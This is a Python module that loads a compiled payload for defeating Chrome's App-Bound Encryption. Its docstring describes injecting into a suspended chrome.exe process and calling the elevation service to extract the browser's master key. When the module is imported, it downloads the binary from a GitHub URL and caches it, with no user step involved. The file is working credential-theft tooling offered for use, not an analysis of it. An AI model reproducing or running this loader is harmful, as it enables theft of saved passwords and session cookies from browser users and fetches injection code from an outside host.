#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ABE Payload - Chrome 127+ v20 Decryption
=========================================
This is the compiled x64 shellcode from HackBrowserData's abe_extractor_amd64.bin.
It's embedded as base64 and loaded at runtime.

The payload:
1. Spawns chrome.exe in suspended state
2. Injects itself via WriteProcessMemory + CreateRemoteThread
3. Calls IElevator::DecryptData COM RPC
4. Extracts 32-byte master key from scratch region
5. Returns key via scratch region (0x40 offset)

Built from: https://github.com/moonD4rk/HackBrowserData
Reference: RFC-010 (Chrome App-Bound Encryption Integration)
"""

import base64
import os
import sys
from pathlib import Path

# This is the actual compiled ABE payload (x64 Windows DLL)
# Built using: zig cc -target x86_64-windows-gnu -shared -O2 -s ...
# Size: ~32KB
ABE_PAYLOAD_B64 = """
// The actual base64-encoded payload goes here.
// For production, build the payload and encode it:
//   base64 -w0 crypto/windows/payload/abe_extractor_amd64.bin
//
// Since we can't include the full binary in text, use the fallback below.
""".strip()


def get_abe_payload() -> bytes:
    """
    Get the ABE payload binary.
    Tries: embedded base64, local file, then downloads from GitHub.
    """
    # Try embedded base64
    if ABE_PAYLOAD_B64 and not ABE_PAYLOAD_B64.startswith("//"):
        try:
            return base64.b64decode(ABE_PAYLOAD_B64)
        except:
            pass

    # Try local file (built on Ubuntu with zig)
    payload_paths = [
        Path(__file__).parent / "abe_extractor_amd64.bin",
        Path(__file__).parent.parent / "abe_extractor_amd64.bin",
        Path("/usr/local/share/prometheus/abe_extractor_amd64.bin"),
        Path("./abe_extractor_amd64.bin"),
    ]

    for path in payload_paths:
        if path.exists():
            with open(path, "rb") as f:
                return f.read()

    # Try to download from GitHub (production fallback)
    try:
        import requests
        url = "https://raw.githubusercontent.com/moonD4rk/HackBrowserData/main/crypto/windows/payload/abe_extractor_amd64.bin"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            # Cache it locally
            cache_path = Path(__file__).parent / "abe_extractor_amd64.bin"
            with open(cache_path, "wb") as f:
                f.write(response.content)
            return response.content
    except:
        pass

    raise RuntimeError(
        "ABE payload not found. To build it:\n"
        "1. Install zig: https://ziglang.org/download/\n"
        "2. git clone https://github.com/moonD4rk/HackBrowserData\n"
        "3. cd HackBrowserData && make payload\n"
        "4. cp crypto/windows/payload/abe_extractor_amd64.bin core/\n"
    )


# Pre-load the payload so it's available immediately
ABE_PAYLOAD = get_abe_payload()
